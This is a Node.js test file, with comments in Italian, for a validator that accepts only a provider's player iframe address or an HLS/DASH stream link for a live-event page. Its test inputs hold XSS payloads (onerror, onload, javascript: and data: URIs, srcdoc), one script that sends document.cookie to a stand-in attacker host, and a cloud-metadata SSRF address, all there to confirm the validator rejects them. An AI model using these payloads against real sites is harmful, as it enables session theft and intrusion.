/* ============================================================
   PROVE - il video della diretta: da dove arriva
   (lib/diretta-sorgente-video.js) e come lo tratta il servizio
   (lib/diretta-dati.js)
   ------------------------------------------------------------
       node prove/diretta-video.prove.js

   Niente da installare, niente rete, niente emulatori: il servizio
   gira su un piccolo Firestore in memoria. Esce con 1 se qualcosa e'
   rosso.

   COSA DIMOSTRANO.
   - La copia del servizio e' identica a quella del sito
     (diretta/sorgente-video.js); HOST_AZOTO e' uno solo, in un solo
     posto; non c'e' piu' nessuna traccia della vecchia piattaforma
     video (il suo nome qui si scrive a pezzi, per non comparire nelle
     ricerche) nelle funzioni, nelle librerie e nelle prove del servizio.
   - IL PLAYER DI AZOTO. Dal codice vero di Azoto (virgolette singole,
     <div>, <iframe>, <script>) si prende SOLO l'indirizzo del primo
     iframe. Il codice malevolo non passa mai: <script>, onload=,
     <img onerror>, srcdoc, javascript:, data:, l'iframe di un altro
     sito, due iframe con il primo non di Azoto, data-src messo per
     ingannare, virgolette dentro l'indirizzo; si leggono anche l'src
     senza virgolette e gli &amp;. Si accetta SOLO https di
     cdn.azotosolutions.com: azotosolutions.com senza cdn., altri
     sottodomini, nomi che lo contengono, http://, un'altra porta, le
     credenziali: rifiutati, ognuno con il suo motivo.
   - IL FLUSSO DIRETTO. HLS (.m3u8, anche con token) e DASH (.mpd) come
     prima; RTMP/RTSP/SRT, file video e segmenti, http, credenziali,
     localhost, testo qualsiasi: rifiutati con il motivo.
   - I DUE CAMPI della gestione: perAzoto (un .m3u8 li' -> «va nel campo
     Flusso diretto») e perFlusso (l'indirizzo di Azoto li' -> «va nel
     campo Player Azoto»); eAzoto per il player della pagina.
   - IL SERVIZIO: leggiAzoto e leggiVideo; campiVideo per le due
     modalita', dentro e fuori onda (con Azoto niente videoRiserva ne'
     videoFirmato; fuori onda nessun indirizzo); eventoJSON con
     tipoPlayer, azotoUrl, azotoInOnda e mai la chiave della firma; un
     evento di prima (senza tipoPlayer) con l'indirizzo di Azoto nel
     link principale; e, sul Firestore in memoria: evento-salva (codice,
     indirizzo, codice malevolo, un indirizzo nel campo sbagliato, il
     flusso diretto senza il suo link), evento-video (l'indirizzo di
     Azoto cambiato in onda), evento-player (A -> B -> A in onda, la
     riconferma che aggiorna videoAggiornato, B senza flusso -> 400),
     evento-stato, evento-sorgente (anche lei aggiorna videoAggiornato a
     OGNI comando: e' la "riconferma" che riporta sul link scelto chi ci
     era passato da solo dopo un guasto) e link-video / link-firmato
     (solo per il flusso: con Azoto 409 'non-flusso').
   ============================================================ */
'use strict';
const fs = require('fs');
const path = require('path');
const V = require('../lib/diretta-sorgente-video');

let rossi = 0, verdi = 0;
function vero(cond, descrizione) {
    if (cond) verdi++;
    else { rossi++; console.log('ROSSO  ' + descrizione); }
}

const AZOTO = 'https://cdn.azotosolutions.com/cloudtv/livetv91/player';
const AZOTO_30 = 'https://cdn.azotosolutions.com/cloudtv/livetv92/player';
// il codice che Azoto ha dato, cosi' com'e' (virgolette singole)
const CODICE_AZOTO = "<div class='azoto-player-container'>\n<iframe src='https://cdn.azotosolutions.com/cloudtv/livetv91/player' frameborder='0' scrolling='no' allowfullscreen></iframe>\n</div>\n<script src='https://azotosolutions.com/videojs/azoto-player.js'></script>";
const HLS = 'https://webtv.esempio.it/live/napoli/playlist.m3u8';
const HLS_RISERVA = 'https://riserva.webtv.esempio.it/live/napoli/playlist.m3u8';

/* ---------- la copia del servizio e' la stessa del sito ---------- */
const sito = fs.readFileSync(path.resolve(__dirname, '../../diretta/sorgente-video.js'), 'utf8');
const servizio = fs.readFileSync(path.resolve(__dirname, '../lib/diretta-sorgente-video.js'), 'utf8');
vero(sito === servizio, 'email-service/lib/diretta-sorgente-video.js e\' identica a diretta/sorgente-video.js (si modifica il sito e si ricopia)');
const VECCHIA = new RegExp('you' + 'tu', 'i');
vero(!VECCHIA.test(sito), 'nessuna traccia della vecchia piattaforma video in sorgente-video.js');
const cartella = c => fs.readdirSync(path.resolve(__dirname, c)).filter(f => /^diretta-.*\.js$/.test(f)).map(f => path.resolve(__dirname, c, f));
const fileDiretta = cartella('../lib').concat(cartella('../api'), cartella('.'),
    [path.resolve(__dirname, '../../diretta/prove/accesso.prova.js'), path.resolve(__dirname, '../../diretta/prove/regole.prova.js')]);
const conVecchia = fileDiretta.filter(f => VECCHIA.test(fs.readFileSync(f, 'utf8'))).map(f => path.basename(f));
vero(conVecchia.length === 0, 'nessuna traccia della vecchia piattaforma video nelle funzioni, nelle librerie e nelle prove della diretta: ' + conVecchia.join(', '));

/* ---------- HOST_AZOTO: uno solo, in un solo posto ---------- */
vero(JSON.stringify(V.HOST_AZOTO) === '["cdn.azotosolutions.com"]' && Object.isFrozen(V.HOST_AZOTO), 'HOST_AZOTO = [\'cdn.azotosolutions.com\'] (e non si puo\' allungare da fuori)');
const codiceSenzaCommenti = sito.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
vero((codiceSenzaCommenti.match(/azotosolutions\.com/g) || []).length === 1, 'nel codice di sorgente-video.js il nome del server di Azoto compare una volta sola (in HOST_AZOTO: i messaggi lo prendono da li\')');

/* ---------- quello che si accetta ---------- */
const buoni = [
    // il flusso diretto
    [HLS, 'hls', HLS],
    ['  https://cdn.webtv.it/hls/evento/index.m3u8?token=abc123&scade=99  ', 'hls', 'https://cdn.webtv.it/hls/evento/index.m3u8?token=abc123&scade=99'],
    ['https://cdn.webtv.it/HLS/EVENTO/MASTER.M3U8', 'hls', 'https://cdn.webtv.it/HLS/EVENTO/MASTER.M3U8'],
    ['https://cdn.webtv.it/hls/evento/index.m3u8#inizio', 'hls', 'https://cdn.webtv.it/hls/evento/index.m3u8'],
    ['https://webtv.esempio.it:8443/live/napoli/playlist.m3u8', 'hls', 'https://webtv.esempio.it:8443/live/napoli/playlist.m3u8'],
    ['https://load-balancer.azotosolutions.com/cdnedge29/smil:live29.smil/playlist.m3u8', 'hls', 'https://load-balancer.azotosolutions.com/cdnedge29/smil:live29.smil/playlist.m3u8'],
    ['https://dash.webtv.it/live/napoli/manifest.mpd', 'dash', 'https://dash.webtv.it/live/napoli/manifest.mpd'],
    ['https://dash.webtv.it/live/napoli/Manifest.MPD?t=1#x', 'dash', 'https://dash.webtv.it/live/napoli/Manifest.MPD?t=1'],
    ['<iframe src="https://webtv.esempio.it/live/napoli/playlist.m3u8"></iframe>', 'hls', HLS],
    // il player di Azoto
    [CODICE_AZOTO, 'incorporato', AZOTO],
    [AZOTO, 'incorporato', AZOTO],
    ['  ' + AZOTO + '/  ', 'incorporato', AZOTO + '/'],
    ['https://CDN.AzotoSolutions.COM/cloudtv/livetv91/player', 'incorporato', AZOTO],
    ['https://cdn.azotosolutions.com:443/cloudtv/livetv91/player', 'incorporato', AZOTO],
    ['https://cdn.azotosolutions.com/cloudtv/livetv91/player?lingua=it', 'incorporato', AZOTO + '?lingua=it'],
    ['<iframe width="640" height="360" src="' + AZOTO + '?a=1&amp;b=2" frameborder="0" allowfullscreen></iframe>', 'incorporato', AZOTO + '?a=1&b=2'],
    ["<IFRAME SRC='" + AZOTO + "'></IFRAME>", 'incorporato', AZOTO],
    ['<div style="padding:56% 0 0"><iframe src=' + AZOTO + ' allow="autoplay"></iframe></div>', 'incorporato', AZOTO],
    ['<iframe\n  src = "' + AZOTO + '"\n></iframe>', 'incorporato', AZOTO],
    ['<iframe/src=' + AZOTO + '>', 'incorporato', AZOTO]
];
buoni.forEach(([testo, tipo, valore]) => {
    const r = V.leggi(testo);
    vero(r && !r.errore && r.tipo === tipo && r.valore === valore, 'accettato come ' + tipo + ': ' + JSON.stringify(testo).slice(0, 80) + ' -> ' + JSON.stringify(r));
    vero(!r || r.errore || V.tipoDi(r.valore) === tipo, 'il valore salvato si riconosce di nuovo come ' + tipo + ': ' + (r && r.valore));
});

/* ---------- il codice malevolo: si prende solo l'indirizzo, o niente ---------- */
const malevoli = [
    ['<script>alert(1)</script>', { errore: 'codice' }],
    ['<img src=x onerror=alert(1)>', { errore: 'codice' }],
    ['<svg onload=alert(1)></svg>', { errore: 'codice' }],
    ['<img src=x onerror=alert(1)><iframe src=\'' + AZOTO + '\'></iframe>', { valore: AZOTO }],
    ['<script>fetch("https://ladro.example.com/?c="+document.cookie)</script>' + CODICE_AZOTO, { valore: AZOTO }],
    ["<iframe src='" + AZOTO + "' onload='alert(1)' style='position:fixed;inset:0'></iframe>", { valore: AZOTO }],
    ['<iframe src=' + AZOTO + ' onload=alert(1)>', { valore: AZOTO }],
    ["<iframe title='chiudi >' srcdoc='<script>alert(1)</script>' src='" + AZOTO + "'></iframe>", { valore: AZOTO }],
    ["<iframe src='javascript:alert(1)'></iframe>", { errore: 'formato' }],
    ['<iframe src="  JaVaScRiPt:alert(document.domain)"></iframe>', { errore: 'formato' }],
    ['<iframe src="&#106;avascript:alert(1)"></iframe>', { errore: 'formato' }],
    ['<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>', { errore: 'formato' }],
    ['<iframe src="data:text/html,<script>alert(1)</script>"></iframe>', { errore: 'formato' }],
    ['<iframe src="//cdn.azotosolutions.com/cloudtv/livetv91/player"></iframe>', { errore: 'formato' }],
    ["<iframe src='https://ladro.example.com/player'></iframe>", { errore: 'non-azoto' }],
    ["<iframe src='https://ladro.example.com/x'></iframe><iframe src='" + AZOTO + "'></iframe>", { errore: 'non-azoto' }],
    ["<iframe src='" + AZOTO + "'></iframe><iframe src='https://ladro.example.com/x'></iframe>", { valore: AZOTO }],
    ["<iframe data-src='" + AZOTO + "' src='https://ladro.example.com/'></iframe>", { errore: 'non-azoto' }],
    ["<iframe srcdoc='<p>ciao</p>' data-src='" + AZOTO + "'></iframe>", { errore: 'codice' }],
    ["<iframe src='" + AZOTO + "\" onload=\"alert(1)'></iframe>", { errore: 'formato' }],
    ['<iframe src="' + AZOTO + '<script>alert(1)</script>"></iframe>', { errore: 'formato' }],
    ['<iframe src="' + AZOTO + '`onload=`"></iframe>', { errore: 'formato' }],
    ['<iframe width="640"></iframe>', { errore: 'codice' }],
    ["<iframe src=''></iframe>", { errore: 'codice' }],
    ['javascript:alert(1)', { errore: 'formato' }],
    ['vbscript:msgbox(1)', { errore: 'formato' }],
    ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', { errore: 'formato' }]
];
malevoli.forEach(([testo, atteso]) => {
    const r = V.leggi(testo);
    const ok = atteso.valore ? (r && r.tipo === 'incorporato' && r.valore === atteso.valore) : (r && r.errore === atteso.errore);
    vero(ok, 'codice malevolo ' + JSON.stringify(testo).slice(0, 90) + ' -> ' + JSON.stringify(atteso) + ' (ottenuto ' + JSON.stringify(r) + ')');
    // qualunque cosa esca, mai un pezzo di HTML o di script
    vero(!r || r.errore || !/[<>"'`\s]|script|onload|onerror|javascript|data:/i.test(r.valore), 'nel valore salvato nessun pezzo di HTML o di script: ' + (r && r.valore));
});

/* ---------- l'host: SOLO https di cdn.azotosolutions.com, porta normale ---------- */
const host = [
    ['https://azotosolutions.com/cloudtv/livetv91/player', 'non-azoto'],
    ['https://www.azotosolutions.com/cloudtv/livetv91/player', 'non-azoto'],
    ['https://cdn2.azotosolutions.com/cloudtv/livetv91/player', 'non-azoto'],
    ['https://cdn9-ger.azotosolutions.com/cloudtv/livetv91/player', 'non-azoto'],
    ['https://x.cdn.azotosolutions.com/cloudtv/livetv91/player', 'non-azoto'],
    ['https://cdn.azotosolutions.com.ladro.it/cloudtv/livetv91/player', 'non-azoto'],
    ['https://cdn-azotosolutions.com/cloudtv/livetv91/player', 'non-azoto'],
    ['https://ladro.it/cdn.azotosolutions.com/cloudtv/livetv91/player', 'non-azoto'],
    ['https://ladro.it/?https://cdn.azotosolutions.com/player', 'non-azoto'],
    ['https://cdn.azotosolutions.com:8443/cloudtv/livetv91/player', 'non-azoto'],
    ['https://cdn.azotosolutions.com:80/cloudtv/livetv91/player', 'non-azoto'],
    ['http://cdn.azotosolutions.com/cloudtv/livetv91/player', 'https'],
    ['https://cdn.azotosolutions.com@ladro.it/cloudtv/livetv91/player', 'credenziali'],
    ['https://utente:pw@cdn.azotosolutions.com/cloudtv/livetv91/player', 'credenziali'],
    ['https://player.webtv.it/embed/napoli-2026', 'non-azoto'],
    ['https://www.webtv-qualunque.com/canale/diretta', 'non-azoto'],
    ['<iframe width="640" height="360" src="https://player.webtv.it/embed/123?autoplay=1&amp;muted=1"></iframe>', 'non-azoto'],
    ['https://169.254.169.254/latest/meta-data/', 'non-azoto']
];
host.forEach(([testo, errore]) => {
    const r = V.leggi(testo);
    vero(r && r.errore === errore, 'host non consentito (' + errore + '): ' + testo.slice(0, 80) + ' -> ' + JSON.stringify(r));
});
vero(/solo un indirizzo https di cdn\.azotosolutions\.com/.test(V.messaggio({ errore: 'non-azoto' })), 'messaggio non-azoto: «' + V.messaggio({ errore: 'non-azoto' }) + '»');

/* ---------- quello che si rifiuta, con il motivo ---------- */
const cattivi = [
    ['http://webtv.esempio.it/live/playlist.m3u8', 'https', /https:\/\//],
    ['rtmp://ingest.webtv.it/live/chiave-segreta', 'rtmp', /RTMP/],
    ['rtmps://ingest.webtv.it:443/live/x', 'rtmp', /RTMP/],
    ['rtsp://camera.webtv.it/live', 'rtmp', /RTMP/],
    ['srt://ingest.webtv.it:9000', 'rtmp', /RTMP/],
    ['https://cdn.webtv.it/video/replica.mp4', 'file', /file video/],
    ['https://cdn.webtv.it/video/replica.webm', 'file', /file video/],
    ['https://cdn.webtv.it/video/replica.MOV', 'file', /file video/],
    ['https://cdn.webtv.it/video/replica.mkv?x=1', 'file', /file video/],
    ['https://cdn.webtv.it/live/napoli/segmento_000123.ts', 'file', /file video/],
    ['https://cdn.webtv.it/live/napoli/chunk-5.m4s', 'file', /file video/],
    ['https://cdn.webtv.it/archivio/vecchio.flv', 'file', /file video/],
    ['https://utente:segreta@webtv.it/live/playlist.m3u8', 'credenziali', /password/],
    ['javascript:alert(1)', 'formato', /Non riconosco/],
    ['https://webtv.it/a b.m3u8', 'formato', /Non riconosco/],
    ['https://localhost/a.m3u8', 'formato', /Non riconosco/],
    ['https://server-interno/a.m3u8', 'formato', /Non riconosco/],
    ['https://webtv.it/"onload=x', 'formato', /Non riconosco/],
    ['diretta di napoli', 'formato', /Non riconosco/],
    ['abcdefghijk', 'formato', /Non riconosco/],
    ['<iframe width="640"></iframe>', 'codice', /non trovo l'indirizzo del player/],
    ['<script src=\'https://azotosolutions.com/videojs/azoto-player.js\'></script>', 'codice', /non trovo l'indirizzo del player/],
    ['https://webtv.it/' + 'a'.repeat(1100), 'lungo', /troppo lungo/]
];
cattivi.forEach(([testo, errore, messaggio]) => {
    const r = V.leggi(testo);
    vero(r && r.errore === errore && messaggio.test(V.messaggio(r)), 'rifiutato (' + errore + '): ' + testo.slice(0, 60) + ' -> ' + JSON.stringify(r) + ' «' + V.messaggio(r) + '»');
});
vero(/player Azoto/.test(V.messaggio({ errore: 'formato' })) && /\.m3u8/.test(V.messaggio({ errore: 'formato' })), 'il messaggio di un testo qualsiasi dice cosa incollare (player Azoto o flusso .m3u8)');
vero(V.leggi('') === null && V.leggi('   ') === null && V.messaggio(null) === 'Incolla il link della diretta.', 'vuoto: nessun video, e il messaggio chiede di incollare il link');
vero(V.tipoDi('') === '' && V.tipoDi('abcdefghijk') === '' && V.tipoDi('http://x.it/a.m3u8') === '' && V.tipoDi('https://player.webtv.it/embed/1') === '',
    'tipoDi: \'\' per quello che non e\' un link valido (anche la pagina di un\'altra web TV)');

/* ---------- i due campi della gestione ---------- */
{
    const a = V.perAzoto(CODICE_AZOTO);
    vero(a && a.tipo === 'incorporato' && a.valore === AZOTO, 'perAzoto: il codice di Azoto -> l\'indirizzo del player');
    vero(V.perAzoto('') === null && V.perAzoto(null) === null, 'perAzoto: vuoto -> null');
    const f = V.perAzoto(HLS);
    vero(f && f.errore === 'e-flusso' && V.messaggio(f) === 'Questo è il link di un flusso diretto: va nel campo «Flusso diretto (.m3u8)».', 'perAzoto: un .m3u8 -> e-flusso «' + V.messaggio(f) + '»');
    vero(V.perAzoto('https://dash.webtv.it/live/manifest.mpd').errore === 'e-flusso', 'perAzoto: un .mpd -> e-flusso');
    vero(V.perAzoto('https://player.webtv.it/embed/1').errore === 'non-azoto' && V.perAzoto('<script>alert(1)</script>').errore === 'codice'
        && V.perAzoto("<iframe src='javascript:alert(1)'>").errore === 'formato', 'perAzoto: gli altri errori restano quelli di leggi');
    const h = V.perFlusso(HLS);
    vero(h && h.tipo === 'hls' && h.valore === HLS && V.perFlusso('https://dash.webtv.it/live/manifest.mpd').tipo === 'dash', 'perFlusso: HLS e DASH');
    vero(V.perFlusso('') === null, 'perFlusso: vuoto -> null');
    const z = V.perFlusso(AZOTO);
    vero(z && z.errore === 'e-azoto' && V.messaggio(z) === 'Questo è l\'indirizzo del player Azoto: va nel campo «Player Azoto».', 'perFlusso: l\'indirizzo di Azoto -> e-azoto «' + V.messaggio(z) + '»');
    vero(V.perFlusso(CODICE_AZOTO).errore === 'e-azoto', 'perFlusso: il codice di Azoto -> e-azoto');
    const p = V.perFlusso('https://player.webtv.it/embed/1');
    vero(p && p.errore === 'non-flusso' && /\.m3u8/.test(V.messaggio(p)), 'perFlusso: la pagina di un altro sito -> non-flusso «' + V.messaggio(p) + '»');
    vero(V.perFlusso('http://x.it/a.m3u8').errore === 'https' && V.perFlusso('https://x.it/a.mp4').errore === 'file', 'perFlusso: gli altri errori restano quelli di leggi');
    vero(V.eAzoto(AZOTO) === true && V.eAzoto(AZOTO + '/') === true, 'eAzoto: l\'indirizzo del player');
    vero(V.eAzoto(CODICE_AZOTO) === false && V.eAzoto(HLS) === false && V.eAzoto('https://ladro.it/player') === false && V.eAzoto('http://cdn.azotosolutions.com/x') === false
        && V.eAzoto('https://cdn.azotosolutions.com:8443/x') === false && V.eAzoto('') === false && V.eAzoto(null) === false && V.eAzoto({ toString: () => AZOTO }) === false,
    'eAzoto: no per il codice (il player mette il valore nell\'iframe cosi\' com\'e\'), un flusso, un altro sito, http, un\'altra porta, niente, un oggetto');
}

/* ---------- descrizioni e avviso ---------- */
vero(/nostro player/.test(V.descrizione('hls')) && /senza loghi/.test(V.descrizione('hls')), 'descrizione HLS: «' + V.descrizione('hls') + '»');
vero(/DASH/.test(V.descrizione('dash')) && V.descrizione('incorporato') === 'Player Azoto: si vede dentro la nostra pagina con i comandi di Azoto.' && V.descrizione('altro') === '',
    'descrizioni DASH e del player Azoto, niente per un tipo sconosciuto');
vero(V.AVVISO_INCORPORATO === 'Con il player Azoto restano i comandi (e l\'eventuale logo) di Azoto: per usare i nostri comandi serve il link .m3u8 del flusso diretto, da chiedere ad Azoto.',
    'AVVISO_INCORPORATO informativo, come da contratto');
vero(!/ripiego/i.test(sito.replace(/\/\*[\s\S]*?\*\//g, '')), 'il player di Azoto non e\' piu\' un "ripiego" (e\' la modalita\' predefinita)');
vero(V.messaggio(V.leggi(HLS)) === V.descrizione('hls') && V.messaggio(V.leggi(AZOTO)) === V.descrizione('incorporato'), 'messaggio di un link valido: la sua descrizione');
vero(JSON.stringify(V.TIPI) === '["hls","dash","incorporato"]', 'i tipi: hls, dash, incorporato');

/* ============================================================
   IL SERVIZIO
   ============================================================ */
const D = require('../lib/diretta-dati');

/* Un Firestore in memoria, quanto basta alle funzioni degli eventi:
   documenti per percorso; transazioni con get, getAll, set, create,
   update (applicati solo se la transazione arriva in fondo: un errore
   non scrive niente); getAll fuori dalle transazioni. `scritture`
   conta le scritture per documento (il documento dell'evento costa
   mille letture a ogni scrittura). */
function ts(ms) { return { toMillis: () => ms }; }
function memoria(iniziali) {
    const m = { dati: {}, scritture: [], ora: 1000 };
    Object.keys(iniziali || {}).forEach(k => { m.dati[k] = Object.assign({}, iniziali[k]); });
    const rif = percorso => ({ percorso: percorso });
    const foto = r => ({ id: r.percorso.split('/')[1], exists: !!m.dati[r.percorso], data: () => (m.dati[r.percorso] ? Object.assign({}, m.dati[r.percorso]) : undefined) });
    m.ctx = {
        adesso: () => m.ora,
        Timestamp: { fromMillis: ts },
        db: {
            collection: nome => ({ doc: id => rif(nome + '/' + id) }),
            getAll: async (...r) => r.map(foto),
            runTransaction: async fn => {
                const scritte = [];
                const tx = {
                    get: async r => foto(r),
                    getAll: async (...r) => r.map(foto),
                    set: (r, campi) => scritte.push(['set', r, campi]),
                    create: (r, campi) => scritte.push(['create', r, campi]),
                    update: (r, campi) => scritte.push(['update', r, campi])
                };
                const esito = await fn(tx);
                scritte.forEach(([tipo, r, campi]) => {
                    if (tipo === 'update' && !m.dati[r.percorso]) throw new Error('update di un documento che non c\'e\': ' + r.percorso);
                    if (tipo === 'create' && m.dati[r.percorso]) throw new Error('create di un documento che c\'e\' gia\': ' + r.percorso);
                    m.dati[r.percorso] = tipo === 'update' ? Object.assign(m.dati[r.percorso], campi) : Object.assign({}, campi);
                    m.scritture.push(r.percorso);
                });
                return esito;
            }
        }
    };
    return m;
}
// l'errore di una chiamata (o null se e' andata bene)
async function errore(fn) {
    try { await fn(); return null; } catch (e) { return e; }
}
const EVENTO = { id: 'roma-2026', titolo: 'Evento di Roma', luogo: 'Roma', data: '2026-10-02', oraInizio: '09:00', oraFine: '17:30' };

(async () => {
    try {
        /* ---------- leggiVideo (il flusso) e leggiAzoto (il player di Azoto) ---------- */
        const a = D.leggiVideo(HLS + '?token=x', '');
        vero(a.videoId === HLS + '?token=x' && a.videoUrl === a.videoId, 'servizio: il link HLS si salva com\'e\' (videoId = indirizzo)');
        const c = D.leggiVideo('https://dash.webtv.it/live/manifest.mpd', '');
        vero(c.videoId === 'https://dash.webtv.it/live/manifest.mpd', 'servizio: il link DASH si salva');
        const d = D.leggiVideo('https://webtv.esempio.it/live/x.m3u8', 'qualcosa-di-diverso');
        vero(d.videoId === 'https://webtv.esempio.it/live/x.m3u8', 'servizio: con il link, decide il servizio (l\'identificativo mandato dalla pagina non conta)');
        const e = D.leggiVideo('', HLS_RISERVA);
        vero(e.videoId === HLS_RISERVA, 'servizio: senza link, l\'identificativo si legge con le stesse regole');
        const f = D.leggiVideo('', '');
        vero(f.videoId === '' && f.videoUrl === '', 'servizio: nessun flusso');
        [
            ['http://webtv.esempio.it/live.m3u8', /https:\/\//], ['rtmp://ingest.webtv.it/live/x', /RTMP/], ['https://webtv.it/replica.mp4', /file video/],
            ['https://cdn.webtv.it/live/seg1.ts', /file video/], ['<script>alert(1)</script>', /non trovo l'indirizzo del player/],
            ['https://utente:pw@webtv.it/a.m3u8', /password/], ['https://127.0.0.1/live.m3u8', /interno o privato/],
            ['https://10.1.2.3/live.m3u8', /interno o privato/], ['https://169.254.169.254/latest/meta-data', /non è il link di un flusso diretto/],
            ['https://[::1]/live.m3u8', /interno o privato/],
            [AZOTO, /^Questo è l'indirizzo del player Azoto: va nel campo «Player Azoto»\.$/],
            [CODICE_AZOTO, /va nel campo «Player Azoto»/],
            ['https://player.webtv.it/embed/1', /non è il link di un flusso diretto/]
        ].forEach(([l, m]) => {
            const x = (() => { try { D.leggiVideo(l, ''); return null; } catch (y) { return y; } })();
            vero(x && x.stato === 400 && x.codice === 'video' && m.test(x.message), 'servizio, flusso: rifiutato con 400 e il motivo: ' + l.slice(0, 60) + ' («' + (x && x.message) + '»)');
        });
        const vecchioId = (() => { try { D.leggiVideo('', 'vimeo-123456'); return null; } catch (y) { return y; } })();
        vero(vecchioId && /Non riconosco/.test(vecchioId.message), 'servizio: un identificativo che non e\' un link della web TV non si salva piu\'');

        vero(D.leggiAzoto(CODICE_AZOTO) === AZOTO, 'servizio: del codice di Azoto si salva SOLO l\'indirizzo del player');
        vero(D.leggiAzoto('  ' + AZOTO + '  ') === AZOTO && D.leggiAzoto('') === '' && D.leggiAzoto(undefined) === '' && D.leggiAzoto(null) === '', 'servizio: l\'indirizzo (pulito), oppure niente');
        vero(D.leggiAzoto('<script>alert(1)</script>' + CODICE_AZOTO) === AZOTO, 'servizio: uno script prima del codice si ignora, resta l\'indirizzo');
        vero(D.leggiAzoto(' '.repeat(3000) + CODICE_AZOTO) === AZOTO, 'servizio: il codice si legge anche se lungo');
        [
            ["<iframe src='https://ladro.example.com/player'></iframe>", /solo un indirizzo https di cdn\.azotosolutions\.com/],
            ["<iframe src='https://ladro.example.com/x'></iframe>" + CODICE_AZOTO, /solo un indirizzo https di cdn\.azotosolutions\.com/],
            ['https://azotosolutions.com/cloudtv/livetv91/player', /solo un indirizzo https di cdn\.azotosolutions\.com/],
            ['https://cdn.azotosolutions.com:8443/cloudtv/livetv91/player', /solo un indirizzo https di cdn\.azotosolutions\.com/],
            ['http://cdn.azotosolutions.com/cloudtv/livetv91/player', /https:\/\//],
            ["<iframe src='javascript:alert(1)'></iframe>", /Non riconosco/],
            ['<img src=x onerror=alert(1)>', /non trovo l'indirizzo del player/],
            [HLS, /^Questo è il link di un flusso diretto: va nel campo «Flusso diretto \(\.m3u8\)»\.$/],
            [{ html: CODICE_AZOTO }, /Non riconosco/]
        ].forEach(([l, m]) => {
            const x = (() => { try { D.leggiAzoto(l); return null; } catch (y) { return y; } })();
            vero(x && x.stato === 400 && x.codice === 'azoto' && m.test(x.message), 'servizio, player Azoto: rifiutato con 400 (campo azoto) e il motivo: ' + JSON.stringify(l).slice(0, 70) + ' («' + (x && x.message) + '»)');
        });

        /* ---------- campiVideo: cosa va nel documento pubblico, nelle due modalita' ---------- */
        const FIRMA = { schema: 'nginx', segreto: 'chiave-segreta-di-prova', durataOre: 6, parametri: {} };
        const risFlusso = { tipoPlayer: 'flusso', azotoUrl: AZOTO, videoUrl: HLS, videoId: HLS, riservaUrl: HLS_RISERVA, riservaId: HLS_RISERVA, firma: FIRMA };
        const risAzoto = Object.assign({}, risFlusso, { tipoPlayer: 'azoto' });
        const inOnda = D.campiVideo({}, risFlusso, 'in_onda');
        vero(inOnda.tipoPlayer === 'flusso' && inOnda.videoId === HLS && inOnda.videoRiserva === HLS_RISERVA && inOnda.videoFirmato === true && inOnda.sorgente === undefined,
            'flusso in onda: tipoPlayer, videoId (il flusso), videoRiserva e videoFirmato (la sorgente resta quella di prima) ' + JSON.stringify(inOnda));
        const pubblicato = Object.assign({ sorgente: 'riserva' }, inOnda);
        vero(Object.keys(D.campiVideo(pubblicato, risFlusso, 'in_onda')).length === 0, 'flusso in onda e niente di cambiato: nessuna scrittura');
        const fuori = D.campiVideo(pubblicato, risFlusso, 'pausa');
        vero(fuori.videoId === '' && fuori.videoRiserva === '' && fuori.videoFirmato === false && fuori.sorgente === undefined && fuori.tipoPlayer === undefined,
            'flusso, uscendo dall\'onda: via videoId, videoRiserva, videoFirmato; tipoPlayer e sorgente restano ' + JSON.stringify(fuori));
        const senzaRiserva = D.campiVideo(pubblicato, Object.assign({}, risFlusso, { riservaId: '' }), 'in_onda');
        vero(senzaRiserva.videoRiserva === '' && senzaRiserva.sorgente === 'principale', 'tolta la riserva mentre la regia la usava: si torna al principale');
        vero(D.campiVideo({}, { tipoPlayer: 'flusso', videoId: 'abcdefghijk' }, 'in_onda').videoId === undefined, 'un valore vecchio che il player non sa riprodurre non si pubblica');
        vero(D.campiVideo({}, { tipoPlayer: 'flusso', videoId: 'https://player.webtv.it/embed/1' }, 'in_onda').videoId === undefined, 'la pagina di un\'altra web TV salvata prima non si pubblica');
        vero(D.campiVideo({}, Object.assign({}, risFlusso, { firma: { schema: 'nessuna' } }), 'in_onda').videoFirmato === undefined, 'senza firma videoFirmato resta false');

        const azIn = D.campiVideo({}, risAzoto, 'in_onda');
        vero(azIn.tipoPlayer === 'azoto' && azIn.videoId === AZOTO && azIn.videoRiserva === undefined && azIn.videoFirmato === undefined,
            'Azoto in onda: videoId = l\'indirizzo del player; nessun videoRiserva ne\' videoFirmato (anche se il flusso e la firma ci sono) ' + JSON.stringify(azIn));
        const azPubblicato = Object.assign({ sorgente: 'principale', videoRiserva: '', videoFirmato: false }, azIn);
        vero(Object.keys(D.campiVideo(azPubblicato, risAzoto, 'in_onda')).length === 0, 'Azoto in onda e niente di cambiato: nessuna scrittura');
        for (const stato of ['programmato', 'pausa', 'terminato']) {
            const az = Object.assign({ tipoPlayer: 'azoto', videoId: '', videoRiserva: '', sorgente: 'principale', videoFirmato: false }, D.campiVideo(azPubblicato, risAzoto, stato));
            const fl = Object.assign({ tipoPlayer: 'flusso', videoId: '', videoRiserva: '', sorgente: 'principale', videoFirmato: false }, D.campiVideo(pubblicato, risFlusso, stato));
            vero(az.tipoPlayer === 'azoto' && az.videoId === '' && az.videoRiserva === '' && az.videoFirmato === false
                && fl.tipoPlayer === 'flusso' && fl.videoId === '' && fl.videoRiserva === '' && fl.videoFirmato === false,
            'fuori onda (' + stato + '): nessun indirizzo nel documento pubblico, in tutte e due le modalita\'; tipoPlayer c\'e\'');
        }
        const daFlussoAdAzoto = D.campiVideo(pubblicato, risAzoto, 'in_onda');
        vero(daFlussoAdAzoto.tipoPlayer === 'azoto' && daFlussoAdAzoto.videoId === AZOTO && daFlussoAdAzoto.videoRiserva === '' && daFlussoAdAzoto.videoFirmato === false,
            'dal flusso ad Azoto in onda: via riserva e firma, videoId = Azoto ' + JSON.stringify(daFlussoAdAzoto));
        vero(D.campiVideo({}, { tipoPlayer: 'azoto', azotoUrl: 'https://ladro.example.com/player' }, 'in_onda').videoId === undefined, 'un indirizzo di Azoto non valido (salvato a mano) non si pubblica');
        vero(D.campiVideo({}, { tipoPlayer: 'azoto', azotoUrl: '' }, 'in_onda').videoId === undefined, 'Azoto senza indirizzo, in onda: niente video (videoId resta \'\')');
